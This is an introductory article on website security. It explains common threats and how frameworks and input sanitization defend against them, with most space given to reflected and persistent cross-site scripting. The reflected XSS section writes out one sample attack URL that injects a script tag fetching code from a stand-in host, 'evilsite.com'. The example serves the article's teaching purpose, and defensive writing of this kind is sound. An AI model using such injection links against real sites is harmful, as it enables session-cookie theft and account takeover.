# Website security

Website security requires vigilance in all aspects of website design and usage. This introductory article won't make you a website security guru, but it will help you understand where threats come from, and what you can do to harden your web application against the most common attacks.

## What is website security?

The Internet is a dangerous place! With great regularity, we hear about websites becoming unavailable due to denial or service attacks, or displaying modified (and often damaging) information on their homepages. In other high-profile cases, millions of passwords, email addresses, and credit card details have been leaked into the public domain, exposing website users to both personal embarrassment and financial risk.

The purpose of website security is to prevent these (or any) sorts of attacks. The more formal definition of website security *is the act/practice of protecting websites from unauthorized access, use, modification, destruction, or disruption*.

Effective website security requires design effort across the whole of the website: in your web application, the configuration of the web server, your policies for creating and renewing passwords, and the client-side code. While all that sounds very ominous, the good news is that if you're using a server-side web framework, it will almost certainly enable, "by default", robust and well-thought-out defense mechanisms against a number of the more common attacks. Other attacks can be mitigated through your web server configuration -- for example, by enabling HTTPS. Finally, there are publicly available vulnerability scanner tools that can help you find out if you've made any obvious mistakes.

The rest of this article gives you more details about a few common threats and some of the simple steps you can take to protect your site.

<hr>

**Note**: This is an introductory topic, designed to help you start thinking about website security, but it is not exhaustive.

<hr>

## Website security threats

This section lists just a few of the most common website threats and how they are mitigated. As you read, note how threats are most successful when the web application either trusts, or is *not paranoid enough* about the data coming from the browser.

### Cross-Site Scripting (XSS)

XSS is a term used to describe a class of attacks that allow an attacker to inject client-side scripts *through* the website into the browsers of other users. Because the injected code comes to the browser from the site, the code is *trusted* and can do things like send the user's site authorization cookie to the attacker. When the attacker has the cookie, they can log into a site as though they were the user and do anything the user can, such as access their credit card details, see contact details, or change passwords.

<hr>

**Note**: XSS vulnerabilities have been historically more common than any other type of security threat.

<hr>

The XSS vulnerabilities are divided into *reflected* and *persistent*, based on how the site returns the injected scripts to a browser.

* A *reflected* XSS vulnerability occurs when user content that is passed to the server is returned *immediately* and *unmodified* for display in the browser. Any scripts in the original user content will be run when the new page is loaded. For example, consider a site search function where the search terms are encoded as URL parameters, and these terms are displayed along with the results. An attacker can construct a search link that contains a malicious script as a parameter (e.g. `http://mysite.com?q=beer<script%20src="http://evilsite.com/tricky.js"></script>`) and email it to another user. If the target user clicks this "interesting link", the script will be executed when the search results are displayed. As discussed earlier, this gives the attacker all the information they need to enter the site as the target user, potentially making purchases as the user or sharing their contact information.
* A *persistent* XSS vulnerability occurs when the malicious script is *stored* on the website and then later redisplayed unmodified for other users to execute unwittingly. For example, a discussion board that accepts comments that contain unmodified HTML could store a malicious script from an attacker. When the comments are displayed, the script is executed and can send to the attacker the information required to access the user's account. This sort of attack is extremely popular and powerful, because the attacker might not even have any direct engagement with the victims.

While the data from `POST` or `GET` requests is the most common source of XSS vulnerabilities, any data from the browser is potentially vulnerable, such as cookie data rendered by the browser, or user files that are uploaded and displayed.

The best defense against XSS vulnerabilities is to remove or disable any markup that can potentially contain instructions to run the code. For HTML, this includes elements, such as `<script>`, `<object>`, `<embed>`, and `<link>`.

The process of modifying user data so that it can't be used to run scripts or otherwise affect the execution of server code is known as input sanitization. Many web frameworks automatically sanitize user input from HTML forms by default.